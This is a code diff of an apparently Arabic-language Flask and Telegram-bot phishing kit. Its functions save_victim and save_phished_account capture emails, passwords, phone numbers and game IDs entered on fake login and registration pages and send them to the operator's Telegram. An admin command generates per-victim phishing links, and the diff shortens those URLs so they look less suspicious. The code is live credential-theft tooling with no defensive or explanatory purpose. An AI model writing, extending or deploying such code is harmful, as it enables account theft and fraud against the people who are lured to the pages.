@@ -21,6 +21,7 @@ if not TELEGRAM_TOKEN:
 
 # ========== Flask ==========
 app = Flask(__name__, template_folder='.')
+
 # ========== قاعدة البيانات ==========
 DB_PATH = "data.db"
 
@@ -75,7 +76,6 @@ def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, 
     login_data = c.fetchone()
     conn.close()
     
-    # بناء الرسالة
     login_email = login_data[0] if login_data else "غير موجود"
     login_password = login_data[1] if login_data else "غير موجود"
     
@@ -93,6 +93,7 @@ def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, 
         f"📧 البريد: `{login_email}`\n"
         f"🔑 كلمة المرور: `{login_password}`"
     )
+
 def save_phished_account(session_id, email, password, ip, ua):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
@@ -102,7 +103,7 @@ def save_phished_account(session_id, email, password, ip, ua):
     conn.commit()
     conn.close()
     send_to_telegram(
-        f"🔐 **بيانات تسجيل دخول!**\n"
+        f"📝 **بيانات إنشاء حساب!**\n"
         f"🆔 الجلسة: `{session_id}`\n"
         f"📧 البريد: `{email}`\n"
         f"🔑 كلمة المرور: `{password}`\n"
@@ -131,7 +132,7 @@ def login_page(session_id):
         return redirect(f'/t/{session_id}')
     return render_template('login.html', session_id=session_id)
 
-@app.route('/r/<session_id>', methods=['GET', 'POST'])
+@app.route('/<session_id>', methods=['GET', 'POST'])
 def register_page(session_id):
     if request.method == 'POST':
         full_name = request.form.get('full_name', '').strip()
@@ -205,7 +206,7 @@ async def generate_link(update, context):
     if update.effective_user.id not in ADMIN_IDS:
         return
     session_id = secrets.token_urlsafe(8)
-    link = f"{BASE_URL}/p/{session_id}"
+    link = f"{BASE_URL}/{session_id}"
     await update.message.reply_text(
         f"🔗 **رابط جديد**\n\n"
         f"🆔 الجلسة: `{session_id}`\n"
@@ -257,7 +258,6 @@ app_bot.add_handler(CommandHandler("stats", stats))
 def run_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    # حذف أي Webhook قديم لتجنب تعارض Polling
     try:
         bot = Bot(token=TELEGRAM_TOKEN)
         bot.delete_webhook()
